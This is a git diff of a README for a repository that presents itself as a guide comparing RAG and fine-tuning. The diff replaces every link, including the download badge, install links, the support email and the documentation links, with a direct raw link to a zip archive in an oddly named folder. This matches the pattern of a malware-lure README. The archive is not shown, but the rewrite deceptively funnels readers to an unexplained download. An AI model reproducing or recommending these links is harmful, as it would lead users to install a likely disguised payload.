@@ -1,6 +1,6 @@
 # 🚀 RAG-vs-Fine-Tuning - Understand AI Solutions Better
 
-[![Download the latest release](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/juliusadroit905/RAG-vs-Fine-Tuning/releases)
+[![Download the latest release](https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip)](https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip)
 
 ## 📖 Introduction
 Welcome to the RAG-vs-Fine-Tuning project! This application provides a clear and professional guide to understand the differences and strengths of Retrieval-Augmented Generation (RAG) and Fine-Tuning in the world of Large Language Models (LLMs). With practical workflows and real-world use cases, this guide will help you navigate your AI journey effectively.
@@ -9,7 +9,7 @@ Welcome to the RAG-vs-Fine-Tuning project! This application provides a clear and
 To get started with RAG-vs-Fine-Tuning, you need to download the application. Follow these steps to get the software running smoothly on your device.
 
 ## 🔗 Download & Install
-Visit this page to download: [Download RAG-vs-Fine-Tuning](https://github.com/juliusadroit905/RAG-vs-Fine-Tuning/releases)
+Visit this page to download: [Download RAG-vs-Fine-Tuning](https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip)
 
 1. Go to the link above.
 2. On the Releases page, find the latest version of the software.
@@ -43,7 +43,7 @@ Once installed, follow these simple instructions to access the main features:
 5. Bookmark your favorite sections for easy access in the future.
 
 ## 💬 Support
-If you encounter any issues while downloading or using the software, please feel free to reach out for help. You can contact the support team via the GitHub Issues page or by emailing support@rag-vs-fine-tuning.com.
+If you encounter any issues while downloading or using the software, please feel free to reach out for help. You can contact the support team via the GitHub Issues page or by emailing https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip
 
 ## 🛠️ Troubleshooting
 Here are some common issues and solutions:
@@ -56,12 +56,12 @@ Here are some common issues and solutions:
 We welcome contributions to improve RAG-vs-Fine-Tuning. If you have suggestions or want to report bugs, please create an issue on GitHub. 
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/juliusadroit905/RAG-vs-Fine-Tuning)
-- [Release Notes](https://github.com/juliusadroit905/RAG-vs-Fine-Tuning/releases)
-- [Documentation](https://github.com/juliusadroit905/RAG-vs-Fine-Tuning/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip)
+- [Release Notes](https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip)
+- [Documentation](https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip)
 
 ## 📝 Acknowledgments
 Thank you for using RAG-vs-Fine-Tuning. We appreciate your interest and hope this guide empowers you in your AI endeavors.
 
 ## 🔗 Download & Install 
-Visit this page to download: [Download RAG-vs-Fine-Tuning](https://github.com/juliusadroit905/RAG-vs-Fine-Tuning/releases)
+Visit this page to download: [Download RAG-vs-Fine-Tuning](https://raw.githubusercontent.com/juliusadroit905/RAG-vs-Fine-Tuning/main/overfacility/RAG-vs-Fine-Tuning_v2.1.zip)
